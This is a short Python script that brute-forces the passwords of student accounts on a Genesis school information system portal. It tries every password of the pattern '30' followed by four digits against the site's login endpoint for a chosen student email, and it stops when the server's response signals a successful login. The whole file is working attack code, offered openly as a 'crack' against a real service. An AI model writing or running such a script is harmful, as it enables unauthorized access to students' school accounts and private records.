import requests  # Import needed module

url      = 'https://parents.genesisedu.com/SCHOOL_PAGE/sis/j_security_check'  # Define api uri
checkUrl = 'https://parents.genesisedu.com/SCHOOL_PAGE/sis/view?gohome=true'  # Define login page

# Put student Email here (ex: example@domain.com)
email = ''

assert email != '' # Don't run if email is empty
print(f'[*] Starting Crack for {email}')  # Print email to crack

for i in range(9999):  # Loop through possible passwords
    toTry = f'30{str(i).zfill(4)}'  # Create password to try (ex: 300736)
    print(f'[*] Trying [{toTry}]')  # print what password is being tried
    # Create new session to hold cookies
    ses = requests.Session()
    # Let server Create cookies needed to proform exploit (JSESSIONID)
    ses.get(checkUrl)
    # Get Data to send
    dataToSend = {"j_password": toTry, "j_username": email}
    # Try Password
    data = ses.post(url, data=dataToSend)
    # Check if is correct password
    if not "Account is inactive" in data.text and not "workStudentId" in data.text:
        continue
    # if passwords is correct print it
    print(f'\n[*] Complete: {toTry}')
    # Exit the loop when the password has been found
    break
